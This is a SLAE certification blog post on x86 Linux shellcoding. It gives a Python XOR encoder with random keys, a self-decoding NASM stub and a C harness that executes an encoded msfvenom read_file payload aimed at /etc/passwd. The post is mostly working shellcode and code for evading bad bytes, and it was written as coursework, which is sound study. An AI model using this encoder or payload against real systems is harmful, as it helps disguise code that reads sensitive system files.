# Assignment 4: Custom Encoder

- Create a custom encoding scheme like the “Insertion Encoder” we showed you 
- PoC with using execve-stack as the shellcode to encode with your schema and execute 



For this assignment, I will be taking an msfpayload and writing a python script to encode it. Then I will wrap the msfvenomm payload in some assmebly that will decode itself in place and execute.

The msfvenom payload I will encode is generated with:

```bash
msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd  -b '\x00'
```

This results in the following shellcode:
```c
"\xdd\xc1\xbf\x50\xc4\x41\xa4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x13\x31\x7a\x18\x03\x7a\x18\x83\xc2\x54\x26\xb4\x4f\x62\x1e\x32\x90\x8a\x5e\x66\xa1\x43\x93\x18\x48\x90\x94\x1a\x4b\x16\xe5\x95\xac\x9f\x1c\x1f\x32\x8f\xde\x60\xfe\x2f\x57\xa2\xb8\x2b\x68\x23\xb9\x88\x69\x23\xb9\xee\xa4\xa3\x01\xef\x36\xa4\x71\x54\x36\xa4\x71\xaa\xfa\x24\x99\x6f\xfb\xda\xa5\x40\x61\x51\x39\xb1\x19\xf8\xce\xbe\xae\x9e\x30"
```

# Encoding: Python

My python script that will do the encoding is below:

```python
#!/bin/python3
import random
import binascii


# msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd  -b '\x00'
payload = b"\xbe\xd4\xa1\x45\x1e\xda\xc1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x13\x31\x75\x13\x83\xed\xfc\x03\x75\xdb\x43\xb0\xf5\xd5\x3b\x3e\x0a\x19\x3c\x1a\x3b\xd0\xf1\x1c\xb2\x21\xb1\x1e\xc5\xa5\xc2\xa9\x22\x2c\x3b\x13\xac\x3e\xbc\x64\x60\xbe\x35\xa6\xc2\xba\x45\x27\x33\x79\x44\x27\x33\x7d\x8a\xa7\x8b\x7c\x14\xa8\xeb\xc5\x14\xa8\xeb\x39\xd8\x28\x03\xfc\x1d\xd7\x2b\xd1\x84\x5c\xb7\x02\x37\xfc\x44\x2f\xc0\x9a\xaa"

bad_bytes = [ 0xff, 0x00 ]

output = ""
for b in payload:
    # new random byte to xor with
    while True:
        rand_byte = random.randbytes(1)

        # xor real shellcode byte with randomly generated byte
        new_shellcode_byte = b ^ int.from_bytes(rand_byte, 'little')

        # check if new shellcode will contatin 0xff or 0x00    
        if not rand_byte in bad_bytes and not new_shellcode_byte in bad_bytes:
            break
        print("FOUND 0xFF or 0x00 in rand_byte or new_shellcode_byte, generating new random byte!!")
        
    # print(f"{hex(b)} ^ {hex(int.from_bytes(rand_byte, 'little'))} = {hex(new_shellcode_byte)}")
    output += '\\x' + binascii.hexlify(rand_byte).decode('utf-8')
    output += '\\x' + hex(new_shellcode_byte)[2:].zfill(2)

# append our end stub to the end of our payload. This signifies the exit condition.
output += '\\xff\\xff'


print(f"\n{output}\n")
print(", 0x".join(output.split('\\x'))[2:])
print("\nlength: " + str(len(output.split('\\x')) - 1), " - hex: ", str(hex(len(output.split('\\x')) - 1)))
```

This script accepts the original shellcode in the `payload` variable. It then iterates and generates a random byte to xor with each byte of the original payload.

The new shellcode will be in the form of `<random_byte><old_byte ^ random_byte>`. 

If either of these bytes are a `0x00` or `0xff`, a new random byte is generated and the old shellcode is xor'd with the new random byte. This is to avoid `0x00` in the new payload and `0xff` which will be appended as the exit condition during decoding. Additionally, a `bad_bytes` array is used, thus it is trivial to add additional bad characters you would like to avoid in the final shellcode (note that 0xff is required as it is the exit condition).

# Decoder: Assembly

```assembly
; Filename: custom_decode.nasm
; read /etc/passwd


global _start

section .text
_start:
	jmp _shellcode


_decode_stub:
	pop esi 						; ptr to encoded_shellcode
	xor ecx, ecx			
	mul ecx							; ecx, edx, eax all cleared
	xor ebx, ebx					; ebx cleared

_loop:
	mov dl, byte [esi + ecx]		; mov random byte to dl
	mov bl, byte [esi + ecx + 1]	; mov next instruction to be xor'ed
	
	; exit condition
	cmp bl, 0xff 					; is next byte to xor a 0xff 
	jz _execute
	
	xor bl, dl
	mov byte [esi + eax], bl		; move dl to shellcode
	add ecx, 0x2
	inc eax
	jmp _loop


_execute:
	jmp esi


; section .data						; need .data section to be writable
									; OR, compile with 'ld -N' to make .text section not read-only
_shellcode:
	call _decode_stub
	encoded_shellcode: db 0x8b, 0x56, 0x97, 0x56, 0xab, 0x14, 0x77, 0x27, 0x8e, 0x4a, 0x1b, 0x5a, 0x9a, 0x3e, 0x22, 0xfb, 0xc8, 0xbc, 0xef, 0xcb, 0x74, 0x80, 0x91, 0xcb, 0x1c, 0x37, 0x55, 0x9c, 0xce, 0x7f, 0x9c, 0x8f, 0x17, 0x26, 0xb3, 0xc9, 0x90, 0x88, 0x66, 0x65, 0xf2, 0x88, 0x7b, 0x63, 0xcb, 0x48, 0x78, 0xba, 0x40, 0x14, 0x23, 0x05, 0x91, 0x25, 0xa2, 0xed, 0xd7, 0xb5, 0x01, 0x1f, 0xd2, 0xe0, 0xae, 0x3e, 0xef, 0x65, 0x0f, 0x51, 0x37, 0x51, 0x45, 0xe4, 0xe9, 0xaa, 0xcb, 0x58, 0x4a, 0x52, 0x83, 0xcb, 0xf9, 0x69, 0x3b, 0xaf, 0x2b, 0x31, 0x86, 0xcd, 0x28, 0x3e, 0xd1, 0x34, 0xf3, 0x66, 0xed, 0x41, 0x42, 0xdd, 0xb4, 0xa8, 0x59, 0x46, 0x81, 0xb3, 0x77, 0xf8, 0xca, 0x14, 0x76, 0x16, 0x04, 0xfa, 0x96, 0xb9, 0x82, 0xd5, 0xd3, 0x71, 0x7d, 0xc5, 0x7e, 0x55, 0xcc, 0xa4, 0x86, 0xa5, 0x6e, 0xd7, 0x66, 0xee, 0xd4, 0xbd, 0xcc, 0xef, 0x5d, 0xe4, 0x78, 0x96, 0xe7, 0x43, 0xd4, 0x77, 0x71, 0x70, 0xb7, 0x58, 0x9d, 0xab, 0xb6, 0x12, 0x74, 0x05, 0xfe, 0xaa, 0x4a, 0x7c, 0xb5, 0x11, 0x42, 0x33, 0x09, 0xa3, 0xc2, 0x38, 0x3f, 0x1b, 0xf5, 0x6c, 0xd7, 0xb8, 0xbd, 0x46, 0x09, 0xd3, 0x66, 0xc3, 0x5b, 0x1b, 0x08, 0x69, 0x77, 0x26, 0xb4, 0x8d, 0x16, 0xa7, 0xcd, 0xd4, 0x76, 0x8e, 0x1c, 0xd2, 0x75, 0xcb, 0x94, 0x3a, 0x09, 0x97, 0x39, 0x09, 0xff, 0xff

```

Here, the `encoded_shellcode` is the output from the previous python encoder script.

This assembly just reverses the encoding process. First, a pointer to the original shellcode is loaded into the `esi` register using the jmp, call, pop technique.

It then jumps by 2 bytes during each loop and grabs the random_byte in `dl` and the xor'd original byte in `bl`. It then xor's these two values for the actual original byte, and overwrites the encoded shellcode in place.

Once an `0xff` is found, the exit condition has been met, and the code jumps to the position pointed at by `esi`, the decoded shellcode.

# Testing

This can be tested with the following test_decoder.c file:
```c
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xeb\x20\x5e\x31\xc9\xf7\xe1\x31\xdb\x8a\x14\x0e\x8a\x5c\x0e\x01\x80\xfb\xff\x74\x0b\x30\xd3\x88\x1c\x06\x83\xc1\x02\x40\xeb\xe9\xff\xe6\xe8\xdb\xff\xff\xff\x8b\x56\x97\x56\xab\x14\x77\x27\x8e\x4a\x1b\x5a\x9a\x3e\x22\xfb\xc8\xbc\xef\xcb\x74\x80\x91\xcb\x1c\x37\x55\x9c\xce\x7f\x9c\x8f\x17\x26\xb3\xc9\x90\x88\x66\x65\xf2\x88\x7b\x63\xcb\x48\x78\xba\x40\x14\x23\x05\x91\x25\xa2\xed\xd7\xb5\x01\x1f\xd2\xe0\xae\x3e\xef\x65\x0f\x51\x37\x51\x45\xe4\xe9\xaa\xcb\x58\x4a\x52\x83\xcb\xf9\x69\x3b\xaf\x2b\x31\x86\xcd\x28\x3e\xd1\x34\xf3\x66\xed\x41\x42\xdd\xb4\xa8\x59\x46\x81\xb3\x77\xf8\xca\x14\x76\x16\x04\xfa\x96\xb9\x82\xd5\xd3\x71\x7d\xc5\x7e\x55\xcc\xa4\x86\xa5\x6e\xd7\x66\xee\xd4\xbd\xcc\xef\x5d\xe4\x78\x96\xe7\x43\xd4\x77\x71\x70\xb7\x58\x9d\xab\xb6\x12\x74\x05\xfe\xaa\x4a\x7c\xb5\x11\x42\x33\x09\xa3\xc2\x38\x3f\x1b\xf5\x6c\xd7\xb8\xbd\x46\x09\xd3\x66\xc3\x5b\x1b\x08\x69\x77\x26\xb4\x8d\x16\xa7\xcd\xd4\x76\x8e\x1c\xd2\x75\xcb\x94\x3a\x09\x97\x39\x09\xff\xff";


int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}
```


To obtain the `code` here, we compile and link the assembly defined above. However, due to the large data blob of the encoded shellcode, I was receiving errors when trying to execute this test_decoder.c file. Upon further inspection, I noticed my previous function to dump shellcode was removing important bytes from my shellcode. Thus, I rewrote it to (hopefully) be more consistant:

```bash
dump-shellcode () {
    # OLD METHOD
    # objdump -d "$1" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

    # NEW METHOD
    objdump -d "$1" |grep '[0-9a-f]:' | grep -v file | cut -d':' -f2- | sed 's/^\W*//g' | grep -Po "^([0-9a-f]{2} )+" | tr -d '\n' | sed 's/\W/\\x/g' | sed 's/^/\\x/g' | rev | cut -c3- |rev
}
```

running `dump-shellcode <compiled_linked_assembly_binary>` resulted in the full encoded shellcode and worked flawlessly. 

Once the `test.c` file is in order, it can be compiled and ran using:
```bash
gcc -fno-stack-protector -z execstack -m32 test_decoder.c -o test_decoder
./test_decoder
``` 



# Certification Requirements

This blog post has been created for completing the requirements of the SecurityTube/PentesterAcademy [x86 Assembly Language and Shellcoding on Linux (SLAE)](https://www.pentesteracademy.com/course?id=3) certification:

Student ID: SLAE-alecjmaly
